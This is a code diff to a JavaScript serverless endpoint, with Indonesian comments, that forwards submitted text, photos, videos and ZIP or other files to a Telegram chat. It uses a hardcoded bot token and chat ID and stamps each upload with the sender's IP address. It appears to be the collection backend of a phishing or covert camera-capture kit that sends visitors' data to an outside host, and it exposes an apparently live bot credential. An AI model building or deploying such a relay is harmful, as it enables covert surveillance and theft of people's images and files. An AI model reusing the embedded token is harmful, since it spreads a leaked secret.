@@ -2,7 +2,7 @@ const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
 const CHAT_ID = "6126622503";
 
 export default async function handler(req, res) {
-    // 1. GET untuk pesan teks
+    // GET untuk pesan
     if (req.method === 'GET' && req.query.msg) {
         try {
             const text = decodeURIComponent(req.query.msg);
@@ -12,13 +12,11 @@ export default async function handler(req, res) {
                 body: JSON.stringify({ chat_id: CHAT_ID, text })
             });
             res.status(200).send('OK');
-        } catch(e) {
-            res.status(500).json({ error: e.message });
-        }
+        } catch(e) { res.status(500).json({ error: e.message }); }
         return;
     }
 
-    // 2. POST untuk foto, video, dokumen (ZIP)
+    // POST
     if (req.method === 'POST') {
         try {
             const { img, video, ts, filename, type } = req.body;
@@ -26,29 +24,17 @@ export default async function handler(req, res) {
             const ua = req.headers['user-agent'] || 'unknown';
             const caption = `📸 ${type || 'media'} | IP: ${ip} | ${new Date(ts).toISOString()}`;
 
-            // Kirim dokumen (ZIP)
-            if (type === 'document' && video) {
+            // Kirim dokumen (ZIP, video, dll)
+            if ((type === 'document' || type === 'video') && video) {
                 const buf = Buffer.from(video, 'base64');
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('document', new Blob([buf], { type: 'application/zip' }), filename || 'archive.zip');
+                const isVideo = type === 'video' || filename?.match(/\.(mp4|webm|mov)$/i);
+                const endpoint = isVideo ? 'sendVideo' : 'sendDocument';
+                const blob = new Blob([buf], { type: isVideo ? 'video/mp4' : 'application/octet-stream' });
+                formData.append(isVideo ? 'video' : 'document', blob, filename || 'file');
                 formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-                res.status(200).send('OK');
-                return;
-            }
-
-            // Kirim video
-            if (type === 'video' && video) {
-                const buf = Buffer.from(video, 'base64');
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', new Blob([buf], { type: 'video/webm' }), filename || 'video.webm');
-                formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                     method: 'POST',
                     body: formData
                 });
@@ -71,7 +57,7 @@ export default async function handler(req, res) {
                 return;
             }
 
-            res.status(400).send('Tidak ada media');
+            res.status(400).send('No media');
         } catch(e) {
             console.error(e);
             res.status(500).json({ error: e.message });
